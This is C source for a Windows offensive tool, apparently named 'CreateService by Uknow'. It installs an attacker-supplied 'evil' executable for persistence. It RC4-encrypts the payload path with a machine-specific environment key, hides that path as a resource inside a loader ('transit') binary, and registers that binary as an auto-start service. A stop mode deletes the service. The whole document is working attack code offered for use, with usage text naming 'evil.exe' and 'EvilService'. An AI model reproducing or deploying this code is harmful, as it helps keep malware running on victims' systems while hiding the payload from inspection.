#include <Windows.h>
#include <Shlwapi.h>
#include <stdio.h>
#include <tchar.h>
#pragma comment(lib, "Shlwapi.lib")
static  char* szName;

// 0 加载服务    1 启动服务    2 停止服务    3 删除服务
BOOL SystemServiceOperate(char* lpszDriverPath, int iOperateType)
{
	BOOL bRet = TRUE;
	//char szName[MAX_PATH] = { 0 };

	//lstrcpy(szName, lpszDriverPath);
	// 过滤掉文件目录，获取文件名
	//PathStripPath(szName);

	SC_HANDLE shSCManager = NULL, shService = NULL;
	SERVICE_STATUS sStatus;
	DWORD dwErrorCode = 0;

	// 打开服务控制管理器数据库
	shSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (0 != iOperateType)
	{
		// 打开一个已经存在的服务
		shService = OpenService(shSCManager, szName, SERVICE_ALL_ACCESS);
		if (!shService)
		{
			CloseServiceHandle(shSCManager);
			shSCManager = NULL;
			return FALSE;
		}
	}

	switch (iOperateType)
	{
	case 0:
	{
		// 创建服务
		// SERVICE_AUTO_START   随系统自动启动
		// SERVICE_DEMAND_START 手动启动
		shService = CreateService(shSCManager, szName, szName,
			SERVICE_ALL_ACCESS,
			SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
			SERVICE_AUTO_START,
			SERVICE_ERROR_NORMAL,
			lpszDriverPath, NULL, NULL, NULL, NULL, NULL);
		break;
	}
	case 1:
	{
		// 启动服务
		StartService(shService, 0, NULL);
		break;
	}
	case 2:
	{
		// 停止服务
		ControlService(shService, SERVICE_CONTROL_STOP, &sStatus);
		break;
	}
	case 3:
	{
		// 删除服务
		DeleteService(shService);
		break;
	}
	default:
		break;
	}
	// 关闭句柄

	CloseServiceHandle(shService);
	CloseServiceHandle(shSCManager);

	return TRUE;
}
void StreamCrypt(char * Data, long Length, char * Key, int KeyLength)
{
	int i = 0, j = 0;
	char k[256] = { 0 }, s[256] = { 0 };
	char tmp = 0;
	for (i = 0; i < 256; i++)
	{
		s[i] = i;
		k[i] = Key[i%KeyLength];
	}
	for (i = 0; i < 256; i++)
	{
		j = (j + s[i] + k[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
	}
	int t = 0;
	i = 0, j = 0, tmp = 0;
	int l = 0;
	for (l = 0; l < Length; l++)
	{
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
		t = (s[i] + s[j]) % 256;
		Data[l] ^= s[t];
	}
}

BOOL AddResource(char* outpath, char* exepath)
{
	StreamCrypt(exepath, strlen(exepath), getenv("PROCESSOR_REVISION"), strlen(getenv("PROCESSOR_REVISION")));
	char Path[256] = {};
	strcpy(Path, exepath);
	HANDLE  hResource = BeginUpdateResource(outpath, FALSE);
	if (NULL != hResource)
	{
		if (UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(100), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), Path, strlen(Path)) != FALSE)
		{
			EndUpdateResource(hResource, FALSE);
			return 1;
		}
	}
	return 0;
}


int main(int argc, TCHAR* argv[])
{
	BOOL bRet = FALSE;
	char* szFileName = argv[1];
	char* evilName = argv[2];
	char* enName = argv[2];
	szName = argv[3];
	printf("[*] CreateService by Uknow\n");
	if (argc != 5)
	{
		printf("   [+] usage: %s TransitPathName EvilPathName ServiceName start/stop\n", argv[0]);
		printf("   [+] eg: %s \"c:\\transit.exe\" \"c:\\evil.exe\" EvilService start/stop\n", argv[0]);
		return -1;
	}
	else if (strcmp(argv[4], "start") == 0) {
		if (!AddResource(argv[1], enName))
		{
			return -1;
		}
		bRet = SystemServiceOperate(szFileName, 0);
		if (FALSE == bRet)
		{
			printf("   [-] Create Error!\n");
			return -1;
		}
		bRet = SystemServiceOperate(szFileName, 1);
		if (FALSE == bRet)
		{
			printf("   [-] Start Error!\n");
			return -1;
		}
		StreamCrypt(evilName, strlen(evilName), getenv("PROCESSOR_REVISION"), strlen(getenv("PROCESSOR_REVISION")));
		printf("    [+] ServiceName: %s\n", szName);
		printf("    [+] TransitPathName: %s\n", szFileName);
		printf("    [+] EvilPathName: %s\n", evilName);
		printf("    [+] Success! Service successfully Create and Start.\n");
		return 0;
	}
	else if (strcmp(argv[4], "stop") == 0)
	{
		bRet = SystemServiceOperate(szFileName, 2);
		if (FALSE == bRet)
		{
			printf("   [-] Stop Error!\n");
			return -1;
		}
		bRet = SystemServiceOperate(szFileName, 3);
		if (FALSE == bRet)
		{
			printf("   [-] Delete Error!\n");
			return -1;
		}
		printf("    [+] ServiceName: %s\n", szName);
		printf("    [+] TransitPathName: %s\n", szFileName);
		printf("    [+] EvilPathName: %s\n", evilName);
		printf("    [+] Success! Service successfully Stop and Delete.\n");
		return 0;
	}
}
